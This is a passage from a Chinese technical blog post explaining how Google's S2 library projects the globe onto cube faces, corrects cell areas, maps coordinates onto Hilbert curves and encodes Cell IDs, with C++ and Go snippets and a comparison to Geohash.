href="#4-2、-球面变平面" class="headerlink" title="4.2、 球面变平面"></a>4.2、 球面变平面</h3><p>接下来一步 S2 把球面碾成平面。怎么做的呢？</p><p>首先在地球外面套了一个外切的正方体，如下图。</p><p><img src="https://cdn.bugwz.com/geohash-s2-37.png" alt="球面外的外切正方体"></p><p>从球心向外切正方体6个面分别投影。S2 是把球面上所有的点都投影到外切正方体的6个面上。</p><p><img src="https://cdn.bugwz.com/geohash-s2-38.png" alt="投影"></p><p>这里简单的画了一个投影图，上图左边的是投影到正方体一个面的示意图，实际上影响到的球面是右边那张图。</p><p><img src="https://cdn.bugwz.com/geohash-s2-39.png" alt="头型横截面示意图"></p><p>从侧面看，其中一个球面投影到正方体其中一个面上，边缘与圆心的连线相互之间的夹角为90°，但是和x，y，z轴的角度是45°。我们可以在球的6个方向上，把45°的辅助圆画出来，见下图左边。</p><p><img src="https://cdn.bugwz.com/geohash-s2-40.png" alt="球面辅助线"></p><p>上图左边的图画了6个辅助线，蓝线是前后一对，红线是左右一对，绿线是上下一对。分别都是45°的地方和圆心连线与球面相交的点的轨迹。这样我们就可以把投影到外切正方体6个面上的球面画出来，见上图右边。</p><p>投影到正方体以后，我们就可以把这个正方体展开了。</p><p><img src="https://cdn.bugwz.com/geohash-s2-41.png" alt="球面投影展开"></p><p>一个正方体的展开方式有很多种。不管怎么展开，最小单元都是一个正方形。</p><p>以上就是 S2 的投影方案。接下来讲讲其他的投影方案。</p><p>首先有下面一种方式，三角形和正方形组合。</p><p><img src="https://cdn.bugwz.com/geohash-s2-42.png" alt="球面投影展开"></p><p>这种方式展开图如下图。</p><p><img src="https://cdn.bugwz.com/geohash-s2-43.png" alt="球面投影展开"></p><p>这种方式其实很复杂，构成子图形由两种图形构成。坐标转换稍微复杂一点。</p><p>再还有一种方式是全部用三角形组成，这种方式三角形个数越多，就能越切近于球体。</p><p><img src="https://cdn.bugwz.com/geohash-s2-44.png" alt="球面投影展开"></p><p>上图最左边的图，由20个三角形构成，可以看的出来，菱角非常多，与球体相差比较大，当三角形个数越来越多，就越来越贴近球体。</p><p><img src="https://cdn.bugwz.com/geohash-s2-45.png" alt="球面投影展开"></p><p>20个三角形展开以后就可能变成这样。</p><p>最后一种方式可能是目前最好的方式，不过也可能是最复杂的方式。按照六边形来投影。</p><p><img src="https://cdn.bugwz.com/geohash-s2-46.png" alt="球面投影展开"></p><p>六边形的菱角比较少，六个边也能相互衔接其他的六边形。看上图最后边的图可以看出来，六边形足够多以后，非常近似球体。</p><p><img src="https://cdn.bugwz.com/geohash-s2-47.png" alt="球面投影展开"></p><p>六边形展开以后就是上面这样。当然这里只有12个六边形。六边形个数越多越好，粒度越细，就越贴近球体。</p><p>Uber 在一个公开分享上提到了他们用的是六边形的网格，把城市划分为很多六边形。这块应该是他们自己开发的。也许滴滴也是划分六边形，也许滴滴有更好的划分方案也说不定。</p><p>在 Google S2 中，它是把地球展开成如下的样子：</p><p><img src="https://cdn.bugwz.com/geohash-s2-48.png" alt="球面投影展开"></p><p>如果上面展开的6个面，假设都用5阶的希尔伯特曲线表示出来的话，6个面会是如下的样子：</p><p><img src="https://cdn.bugwz.com/geohash-s2-49.png" alt="球面投影展开"></p><p><img src="https://cdn.bugwz.com/geohash-s2-50.png" alt="球面投影展开"></p><p><img src="https://cdn.bugwz.com/geohash-s2-51.png" alt="球面投影展开"></p><p><img src="https://cdn.bugwz.com/geohash-s2-52.png" alt="球面投影展开"></p><p><img src="https://cdn.bugwz.com/geohash-s2-53.png" alt="球面投影展开"></p><p><img src="https://cdn.bugwz.com/geohash-s2-54.png" alt="球面投影展开"></p><p>回到 S2 上面来，S2是用的正方形。这样第一步的球面坐标进一步的被转换成 f(x,y,z) -&gt; g(face,u,v)，face是正方形的六个面，u，v对应的是六个面中的一个面上的x，y坐标。</p><h3 id="4-3、-球面矩形投影修正"><a href="#4-3、-球面矩形投影修正" class="headerlink" title="4.3、 球面矩形投影修正"></a>4.3、 球面矩形投影修正</h3><p>上一步我们把球面上的球面矩形投影到正方形的某个面上，形成的形状类似于矩形，但是由于球面上角度的不同，最终会导致即使是投影到同一个面上，每个矩形的面积也不大相同。</p><p><img src="https://cdn.bugwz.com/geohash-s2-56.png" alt="球面矩形投影修正"></p><p>上图就表示出了球面上个一个球面矩形投影到正方形一个面上的情况。</p><p><img src="https://cdn.bugwz.com/geohash-s2-57.png" alt="球面矩形投影修正"></p><p>经过实际计算发现，最大的面积和最小的面积相差5.2倍。见上图左边。相同的弧度区间，在不同的纬度上投影到正方形上的面积不同。</p><p>现在就需要修正各个投影出来形状的面积。如何选取合适的映射修正函数就成了关键。目标是能达到上图右边的样子，让各个矩形的面积尽量相同。</p><p>这块转换的代码在 C++ 的版本里面才有详细的解释，在 Go 的版本里面只一笔带过了。害笔者懵逼了好久。</p><p><img src="https://cdn.bugwz.com/geohash-s2-58.png" alt="转换率"></p><p>线性变换是最快的变换，但是变换比最小。tan() 变换可以使每个投影以后的矩形的面积更加一致，最大和最小的矩形比例仅仅只差0.414。可以说非常接近了。但是 tan() 函数的调用时间非常长。如果把所有点都按照这种方式计算的话，性能将会降低3倍。</p><p>最后谷歌选择的是二次变换，这是一个近似切线的投影曲线。它的计算速度远远快于 tan() ，大概是 tan() 计算的3倍速度。生成的投影以后的矩形大小也类似。不过最大的矩形和最小的矩形相比依旧有2.082的比率。</p><p>上表中，ToPoint 和 FromPoint 分别是把单位向量转换到 Cell ID 所需要的毫秒数、把 Cell ID 转换回单位向量所需的毫秒数（Cell ID 就是投影到正方体六个面，某个面上矩形的 ID，矩形称为 Cell，它对应的 ID 称为 Cell ID）。ToPointRaw 是某种目的下，把 Cell ID 转换为非单位向量所需的毫秒数。</p><p>在 S2 中默认的转换是二次转换。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> S2_PROJECTION S2_QUADRATIC_PROJECTION</span></span><br></pre></td></tr></table></figure><p>详细看看这三种转换到底是怎么转换的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> S2_PROJECTION == S2_LINEAR_PROJECTION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">double</span> <span class="title function_">S2::STtoUV</span><span class="params">(<span class="type">double</span> s)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * s - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">double</span> <span class="title function_">S2::UVtoST</span><span class="params">(<span class="type">double</span> u)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0.5</span> * (u + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> S2_PROJECTION == S2_TAN_PROJECTION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">double</span> <span class="title function_">S2::STtoUV</span><span class="params">(<span class="type">double</span> s)</span> &#123;</span><br><span class="line">  <span class="comment">// Unfortunately, tan(M_PI_4) is slightly less than 1.0.  This isn&#x27;t due to</span></span><br><span class="line">  <span class="comment">// a flaw in the implementation of tan(), it&#x27;s because the derivative of</span></span><br><span class="line">  <span class="comment">// tan(x) at x=pi/4 is 2, and it happens that the two adjacent floating</span></span><br><span class="line">  <span class="comment">// point numbers on either side of the infinite-precision value of pi/4 have</span></span><br><span class="line">  <span class="comment">// tangents that are slightly below and slightly above 1.0 when rounded to</span></span><br><span class="line">  <span class="comment">// the nearest double-precision result.</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">tan</span>(M_PI_2 * s - M_PI_4);</span><br><span class="line">  <span class="keyword">return</span> s + (<span class="number">1.0</span> / (GG_LONGLONG(<span class="number">1</span>) &lt;&lt; <span class="number">53</span>)) * s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">double</span> <span class="title function_">S2::UVtoST</span><span class="params">(<span class="type">double</span> u)</span> &#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">double</span> a = <span class="built_in">atan</span>(u);</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">2</span> * M_1_PI) * (a + M_PI_4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> S2_PROJECTION == S2_QUADRATIC_PROJECTION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">double</span> <span class="title function_">S2::STtoUV</span><span class="params">(<span class="type">double</span> s)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (s &gt;= <span class="number">0.5</span>) <span class="keyword">return</span> (<span class="number">1</span>/<span class="number">3.</span>) * (<span class="number">4</span>*s*s - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span>          <span class="keyword">return</span> (<span class="number">1</span>/<span class="number">3.</span>) * (<span class="number">1</span> - <span class="number">4</span>*(<span class="number">1</span>-s)*(<span class="number">1</span>-s));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">double</span> <span class="title function_">S2::UVtoST</span><span class="params">(<span class="type">double</span> u)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (u &gt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0.5</span> * <span class="built_in">sqrt</span>(<span class="number">1</span> + <span class="number">3</span>*u);</span><br><span class="line">  <span class="keyword">else</span>        <span class="keyword">return</span> <span class="number">1</span> - <span class="number">0.5</span> * <span class="built_in">sqrt</span>(<span class="number">1</span> - <span class="number">3</span>*u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> Unknown value for S2_PROJECTION</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>上面有一处对 tan(M_PI_4) 的处理，是因为精度的原因，导致略小于1.0 。</p><p>所以投影之后的修正函数三种变换应该如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 线性转换</span></span><br><span class="line">u = <span class="number">0.5</span> * ( u + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// tan() 变换</span></span><br><span class="line">u = <span class="number">2</span> / pi * (<span class="built_in">atan</span>(u) + pi / <span class="number">4</span>) = <span class="number">2</span> * <span class="built_in">atan</span>(u) / pi + <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二次变换</span></span><br><span class="line">u &gt;= <span class="number">0</span>，u = <span class="number">0.5</span> * <span class="built_in">sqrt</span>(<span class="number">1</span> + <span class="number">3</span>*u)</span><br><span class="line">u &lt; <span class="number">0</span>， u = <span class="number">1</span> - <span class="number">0.5</span> * <span class="built_in">sqrt</span>(<span class="number">1</span> - <span class="number">3</span>*u)</span><br></pre></td></tr></table></figure><p>注意上面虽然变换公式只写了u，不代表只变换u。实际使用过程中，u，v都分别当做入参，都会进行变换。</p><p>这块修正函数在 Go 的版本里面就直接只实现了二次变换，其他两种变换方式找遍整个库，根本没有提及。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// stToUV converts an s or t value to the corresponding u or v value.</span></span><br><span class="line"><span class="comment">// This is a non-linear transformation from [-1,1] to [-1,1] that</span></span><br><span class="line"><span class="comment">// attempts to make the cell sizes more uniform.</span></span><br><span class="line"><span class="comment">// This uses what the C++ version calls &#x27;the quadratic transform&#x27;.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stToUV</span><span class="params">(s <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">if</span> s &gt;= <span class="number">0.5</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="number">1</span> / <span class="number">3.</span>) * (<span class="number">4</span>*s*s - <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="number">1</span> / <span class="number">3.</span>) * (<span class="number">1</span> - <span class="number">4</span>*(<span class="number">1</span>-s)*(<span class="number">1</span>-s))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// uvToST is the inverse of the stToUV transformation. Note that it</span></span><br><span class="line"><span class="comment">// is not always true that uvToST(stToUV(x)) == x due to numerical</span></span><br><span class="line"><span class="comment">// errors.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">uvToST</span><span class="params">(u <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">if</span> u &gt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0.5</span> * math.Sqrt(<span class="number">1</span>+<span class="number">3</span>*u)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span> - <span class="number">0.5</span>*math.Sqrt(<span class="number">1</span><span class="number">-3</span>*u)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过修正变换以后，u，v都变换成了s，t。值域也发生了变化。u，v的值域是[-1,1]，变换以后，是s，t的值域是[0,1]。</p><p>至此，小结一下，球面上的点S(lat,lng) -&gt; f(x,y,z) -&gt; g(face,u,v) -&gt; h(face,s,t)。目前总共转换了4步，球面经纬度坐标转换成球面xyz坐标，再转换成外切正方体投影面上的坐标，最后变换成修正后的坐标。</p><p>到目前为止，S2 可以优化的点有两处，一是投影的形状能否换成六边形？二是修正的变换函数能否找到一个效果和 tan() 类似的函数，但是计算速度远远高于 tan()，以致于不会影响计算性能？</p><h3 id="4-4、-点与坐标轴点相互转换"><a href="#4-4、-点与坐标轴点相互转换" class="headerlink" title="4.4、 点与坐标轴点相互转换"></a>4.4、 点与坐标轴点相互转换</h3><p>在 S2 算法中，默认划分 Cell 的等级是30，也就是说把一个正方形划分为 2^30 * 2^30个小的正方形。</p><p>那么上一步的s，t映射到这个正方形上面来，对应该如何转换呢？</p><p><img src="https://cdn.bugwz.com/geohash-s2-59.png" alt="点与坐标轴点相互转换"></p><p>s，t的值域是[0,1]，现在值域要扩大到[0,2^30^-1]。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// stToIJ converts value in ST coordinates to a value in IJ coordinates.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stToIJ</span><span class="params">(s <span class="type">float64</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> clamp(<span class="type">int</span>(math.Floor(maxSize*s)), <span class="number">0</span>, maxSize<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C ++ 的实现版本也一样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">S2CellId::STtoIJ</span><span class="params">(<span class="type">double</span> s)</span> &#123;</span><br><span class="line">  <span class="comment">// Converting from floating-point to integers via static_cast is very slow</span></span><br><span class="line">  <span class="comment">// on Intel processors because it requires changing the rounding mode.</span></span><br><span class="line">  <span class="comment">// Rounding to the nearest integer using FastIntRound() is much faster.</span></span><br><span class="line">  <span class="comment">// 这里减去0.5是为了四舍五入</span></span><br><span class="line">  <span class="keyword">return</span> max(<span class="number">0</span>, min(kMaxSize - <span class="number">1</span>, MathUtil::FastIntRound(kMaxSize * s - <span class="number">0.5</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这一步，是h(face,s,t) -&gt; H(face,i,j)。</p><h3 id="4-5、-坐标轴点与希尔伯特曲线-Cell-ID-相互转换"><a href="#4-5、-坐标轴点与希尔伯特曲线-Cell-ID-相互转换" class="headerlink" title="4.5、 坐标轴点与希尔伯特曲线 Cell ID 相互转换"></a>4.5、 坐标轴点与希尔伯特曲线 Cell ID 相互转换</h3><p>最后一步，如何把 i，j 和希尔伯特曲线上的点关联起来呢？</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">lookupBits = <span class="number">4</span></span><br><span class="line">swapMask   = <span class="number">0x01</span></span><br><span class="line">invertMask = <span class="number">0x02</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ijToPos = [<span class="number">4</span>][<span class="number">4</span>]<span class="type">int</span>&#123;</span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>&#125;, <span class="comment">// canonical order</span></span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>&#125;, <span class="comment">// axes swapped</span></span><br><span class="line">&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, <span class="comment">// bits inverted</span></span><br><span class="line">&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>&#125;, <span class="comment">// swapped &amp; inverted</span></span><br><span class="line">&#125;</span><br><span class="line">posToIJ = [<span class="number">4</span>][<span class="number">4</span>]<span class="type">int</span>&#123;</span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>&#125;, <span class="comment">// canonical order:    (0,0), (0,1), (1,1), (1,0)</span></span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>&#125;, <span class="comment">// axes swapped:       (0,0), (1,0), (1,1), (0,1)</span></span><br><span class="line">&#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, <span class="comment">// bits inverted:      (1,1), (1,0), (0,0), (0,1)</span></span><br><span class="line">&#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>&#125;, <span class="comment">// swapped &amp; inverted: (1,1), (0,1), (0,0), (1,0)</span></span><br><span class="line">&#125;</span><br><span class="line">posToOrientation = [<span class="number">4</span>]<span class="type">int</span>&#123;swapMask, <span class="number">0</span>, <span class="number">0</span>, invertMask | swapMask&#125;</span><br><span class="line">lookupIJ         [<span class="number">1</span> &lt;&lt; (<span class="number">2</span>*lookupBits + <span class="number">2</span>)]<span class="type">int</span></span><br><span class="line">lookupPos        [<span class="number">1</span> &lt;&lt; (<span class="number">2</span>*lookupBits + <span class="number">2</span>)]<span class="type">int</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>在变换之前，先来解释一下定义的一些变量。</p><p>posToIJ 代表的是一个矩阵，里面记录了一些单元希尔伯特曲线的位置信息。</p><p>把 posToIJ 数组里面的信息用图表示出来，如下图：</p><p><img src="https://cdn.bugwz.com/geohash-s2-60.png" alt="posToIJ数组信息展示"></p><p>同理，把 ijToPos 数组里面的信息用图表示出来，如下图：</p><p><img src="https://cdn.bugwz.com/geohash-s2-61.png" alt="ijToPos数组信息展示"></p><p>posToOrientation 数组里面装了4个数字，分别是1,0,0,3。<br>lookupIJ 和 lookupPos 分别是两个容量为1024的数组。这里面分别对应的就是希尔伯特曲线 ID 转换成坐标轴 IJ 的转换表，和坐标轴 IJ 转换成希尔伯特曲线 ID 的转换表。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">initLookupCell(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">initLookupCell(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, swapMask, <span class="number">0</span>, swapMask)</span><br><span class="line">initLookupCell(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, invertMask, <span class="number">0</span>, invertMask)</span><br><span class="line">initLookupCell(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, swapMask|invertMask, <span class="number">0</span>, swapMask|invertMask)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是初始化的递归函数，在希尔伯特曲线的标准顺序中可以看到是有4个格子，并且格子都有顺序的，所以初始化要遍历满所有顺序。入参的第4个参数，就是从0 - 3 。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// initLookupCell initializes the lookupIJ table at init time.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initLookupCell</span><span class="params">(level, i, j, origOrientation, pos, orientation <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> level == lookupBits &#123;</span><br><span class="line">ij := (i &lt;&lt; lookupBits) + j</span><br><span class="line">lookupPos[(ij&lt;&lt;<span class="number">2</span>)+origOrientation] = (pos &lt;&lt; <span class="number">2</span>) + orientation</span><br><span class="line">lookupIJ[(pos&lt;&lt;<span class="number">2</span>)+origOrientation] = (ij &lt;&lt; <span class="number">2</span>) + orientation</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">level++</span><br><span class="line">i &lt;&lt;= <span class="number">1</span></span><br><span class="line">j &lt;&lt;= <span class="number">1</span></span><br><span class="line">pos &lt;&lt;= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">r := posToIJ[orientation]</span><br><span class="line"></span><br><span class="line">initLookupCell(level, i+(r[<span class="number">0</span>]&gt;&gt;<span class="number">1</span>), j+(r[<span class="number">0</span>]&amp;<span class="number">1</span>), origOrientation, pos, orientation^posToOrientation[<span class="number">0</span>])</span><br><span class="line">initLookupCell(level, i+(r[<span class="number">1</span>]&gt;&gt;<span class="number">1</span>), j+(r[<span class="number">1</span>]&amp;<span class="number">1</span>), origOrientation, pos+<span class="number">1</span>, orientation^posToOrientation[<span class="number">1</span>])</span><br><span class="line">initLookupCell(level, i+(r[<span class="number">2</span>]&gt;&gt;<span class="number">1</span>), j+(r[<span class="number">2</span>]&amp;<span class="number">1</span>), origOrientation, pos+<span class="number">2</span>, orientation^posToOrientation[<span class="number">2</span>])</span><br><span class="line">initLookupCell(level, i+(r[<span class="number">3</span>]&gt;&gt;<span class="number">1</span>), j+(r[<span class="number">3</span>]&amp;<span class="number">1</span>), origOrientation, pos+<span class="number">3</span>, orientation^posToOrientation[<span class="number">3</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个函数是生成希尔伯特曲线的。我们可以看到有一处对<code>pos &lt;&lt; 2</code>的操作，这里是把位置变换到第一个4个小格子中，所以位置乘以了4。</p><p>由于初始设置的<code>lookupBits = 4</code>，所以i，j的变化范围是从[0,15]，总共有16<em>16&#x3D;256个，然后i，j坐标是表示的4个格子，再细分，<code>lookupBits = 4</code>这种情况下能表示的点的个数就是256</em>4&#x3D;1024个。这也正好是 lookupIJ 和 lookupPos 的总容量。</p><p>画一个局部的图，i，j从0-7变化。</p><p><img src="https://cdn.bugwz.com/geohash-s2-62.png" alt="4阶希尔伯特曲线"></p><p>上图是一个4阶希尔伯特曲线。初始化的实际过程就是初始化4阶希尔伯特上的1024个点的坐标与坐标轴上的x，y轴的对应关系表。</p><p>举个例子，下表是i，j在递归过程中产生的中间过程。下表是<br>lookupPos 表计算过程。</p><p><img src="https://cdn.bugwz.com/geohash-s2-63.png" alt="lookupPos 表计算"></p><p>取出一行详细分析一下计算过程。</p><p>假设当前(i,j)&#x3D;(0,2)，ij 的计算过程是把 i 左移4位再加上 j，整体结果再左移2位。目的是为了留出2位的方向位置。ij的前4位是i，接着4位是j，最后2位是方向。这样计算出ij的值就是8 。</p><p>接着计算lookupPos[i j]的值。从上图中可以看到(0,2)代表的单元格的4个数字是16，17，18，19 。计算到这一步，pos的值为4（pos是专门记录生成格子到第几个了，总共pos的值会循环0-255）。pos代表的是当前是第几个格子(4个小格子组成)，当前是第4个，每个格子里面有4个小格子。所以4*4就可以偏移到当前格子的第一个数字，也就是16 。posToIJ 数组里面会记录下当前格子的形状。从这里我们从中取出 orientation 。</p><p>看上图，16，17，18，19对应的是 posToIJ 数组轴旋转的情况，所以17是位于轴旋转图的数字1代表的格子中。这时 orientation &#x3D; 1 。</p><p>这样 lookupPos[i j] 表示的数字就计算出来了，4*4+1&#x3D;17 。这里就完成了i，j与希尔伯特曲线上数字的对应。</p><p>那如何由希尔伯特曲线上的数字对应到实际的坐标呢？</p><p>lookupIJ 数组里面记录了反向的信息。lookupIJ 数组 和 lookupPos 数组存储的信息正好是反向的。lookupIJ 数组 下表存的值是 lookupPos 数组 的下表。我们查 lookupIJ 数组 ，lookupIJ[17]的值就是8，对应算出来(i,j)&#x3D;(0,2)。这个时候的i，j还是大格子。还是需要借助 posToIJ 数组 里面描述的形状信息。当前形状是轴旋转，之前也知道 orientation &#x3D; 1，由于每个坐标里面有4个小格子，所以一个i，j代表的是2个小格子，所以需要乘以2，再加上形状信息里面的方向，可以计算出实际的坐标 (0 * 2 + 1 , 2 * 2 + 0) &#x3D; ( 1，4) 。</p><p>至此，整个球面坐标的坐标映射就已经完成了。</p><p>球面上的点S(lat,lng) -&gt; f(x,y,z) -&gt; g(face,u,v) -&gt; h(face,s,t) -&gt; H(face,i,j) -&gt; CellID。目前总共转换了6步，球面经纬度坐标转换成球面xyz坐标，再转换成外切正方体投影面上的坐标，最后变换成修正后的坐标，再坐标系变换，映射到 [0,2^30^-1]区间，最后一步就是把坐标系上的点都映射到希尔伯特曲线上。</p><h3 id="4-6、-S2-Cell-ID-数据结构"><a href="#4-6、-S2-Cell-ID-数据结构" class="headerlink" title="4.6、 S2 Cell ID 数据结构"></a>4.6、 S2 Cell ID 数据结构</h3><p>最后需要来谈谈 S2 Cell ID 数据结构，这个数据结构直接关系到不同 Level 对应精度的问题。</p><p><img src="https://cdn.bugwz.com/geohash-s2-64.png" alt="Level 30与Level 24的对比"></p><p>上图左图中对应的是 Level 30 的情况，右图对应的是 Level 24 的情况。(2的多少次方，角标对应的也就是 Level 的值)</p><p>在 S2 中，每个 CellID 是由64位的组成的。可以用一个 uint64 存储。开头的3位表示正方体6个面中的一个，取值范围[0,5]。3位可以表示0-7，但是6，7是无效值。</p><p>64位的最后一位是1，这一位是特意留出来的。用来快速查找中间有多少位。从末尾最后一位向前查找，找到第一个不为0的位置，即找到第一个1。这一位的前一位到开头的第4位（因为前3位被占用）都是可用数字。</p><p>绿色格子有多少个就能表示划分多少格。上图左图，绿色的有60个格子，于是可以表示[0,2^30^ -1] * [0,2^30^ -1]这么多个格子。上图右图中，绿色格子只有48个，那么就只能表示[0,2^24^ -1]*[0,2^24^ -1]这么多个格子。</p><p>那么不同 level 可以代表的网格的面积究竟是多大呢？</p><p>由上一章我们知道，由于投影的原因，所以导致投影之后的面积依旧有大小差别。</p><p>这里推算的公式比较复杂，就不证明了，具体的可以看文档。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MinAreaMetric = Metric&#123;<span class="number">2</span>, <span class="number">8</span> * math.Sqrt2 / <span class="number">9</span>&#125; </span><br><span class="line">AvgAreaMetric = Metric&#123;<span class="number">2</span>, <span class="number">4</span> * math.Pi / <span class="number">6</span>&#125; </span><br><span class="line">MaxAreaMetric = Metric&#123;<span class="number">2</span>, <span class="number">2.635799256963161491</span>&#125;</span><br></pre></td></tr></table></figure><p>这就是最大最小面积和平均面积的倍数关系。</p><p>(下图单位是km^2^，平方公里)</p><p><img src="https://cdn.bugwz.com/geohash-s2-65.png" alt="S2 Level面积"></p><p><img src="https://cdn.bugwz.com/geohash-s2-66.png" alt=" "></p><p>level 0 就是正方体的六个面之一。地球表面积约等于510,100,000 km^2^。level 0 的面积就是地球表面积的六分之一。level 30 能表示的最小的面积0.48cm^2^，最大也就0.93cm^2^ 。</p><h3 id="4-7、-S2-与-Geohash-对比"><a href="#4-7、-S2-与-Geohash-对比" class="headerlink" title="4.7、 S2 与 Geohash 对比"></a>4.7、 S2 与 Geohash 对比</h3><p>Geohash 有12级，从5000km 到 3.7cm。中间每一级的变化比较大。有时候可能选择上一级会大很多，选择下一级又会小一些。比如选择字符串长度为4，它对应的 cell 宽度是39.1km，需求可能是50km，那么选择字符串长度为5，对应的 cell 宽度就变成了156km，瞬间又大了3倍了。这种情况选择多长的 Geohash 字符串就比较难选。选择不好，每次判断可能就还需要取出周围的8个格子再次进行判断。Geohash 需要 12 bytes 存储。</p><p>S2 有30级，从 0.7cm² 到 85,000,000km² 。中间每一级的变化都比较平缓，接近于4次方的曲线。所以选择精度不会出现 Geohash 选择困难的问题。S2 的存储只需要一个 uint64 即可存下。</p><p>S2 库里面不仅仅有地理编码，还有其他很多几何计算相关的库。地理编码只是其中的一小部分。本文没有介绍到的 S2 的实现还有很多很多，各种向量计算，面积计算，多边形覆盖，距离问题，球面球体上的问题，它都有实现。</p><p>S2 还能解决多边形覆盖的问题。比如给定一个城市，求一个多边形刚刚好覆盖住这个城市。</p><p><img src="https://cdn.bugwz.com/geohash-s2-67.png" alt="多边形覆盖问题"></p><p>如上图，生成的多边形刚刚好覆盖住下面蓝色的区域。这里生成的多边形可以有大有小。不管怎么样，最终的结果也是刚刚覆盖住目标物。</p><p><img src="https://cdn.bugwz.com/geohash-s2-68.png" alt="多边形覆盖问题"></p><p>用相同的 Cell 也可以达到相同的目的，上图就是用相同 Level 的 Cell 覆盖了整个圣保罗城市。</p><p>这些都是 Geohash 做不到的。</p><p>多边形覆盖利用的是近似的算法，虽然不是严格意义上的最优解，但是实践中效果特别好。</p><p>额外值得说明的一点是，Google 文档上强调了，这种多边形覆盖的算法虽然对搜索和预处理操作非常有用，但是“不可依赖”的。理由也是因为是近似算法，并不是唯一最优算法，所以得到的解会依据库的不同版本而产生变化。</p><h3 